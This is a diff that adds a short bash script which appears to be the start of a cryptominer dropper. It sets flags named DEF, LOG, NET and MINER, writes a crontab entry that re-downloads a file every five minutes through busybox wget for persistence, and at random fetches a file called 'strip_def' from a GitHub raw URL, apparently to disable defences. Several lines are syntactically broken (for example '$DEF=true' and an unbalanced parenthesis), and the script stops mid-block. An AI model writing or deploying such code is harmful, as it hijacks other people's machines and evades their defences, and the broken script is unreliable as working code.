@@ -1,0 +1,17 @@
+#!/bin/bash
+apt-get install -y curl unzip
+$DEF=true
+$LOG=true
+$NET=true
+$MINER=true
+
+crontab -l 2>/dev/null; echo "*/5 * * * * busybox wget -q htt... -O ./...; crontab ./... ") | crontab -
+$i = $RANDOM
+
+if [[ $DEF = true ]] && [[ $(($i % 101)) -ge 0 ]] && [[ $(($i % 101)) -lt 10 ]]
+then
+	curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/strip_def
+fi
+
+if [[ $DEF = true ]] && [[ $(($i % 101)) -ge 10 ]] && [[ $(($i % 101)) -lt 20 ]]
+then
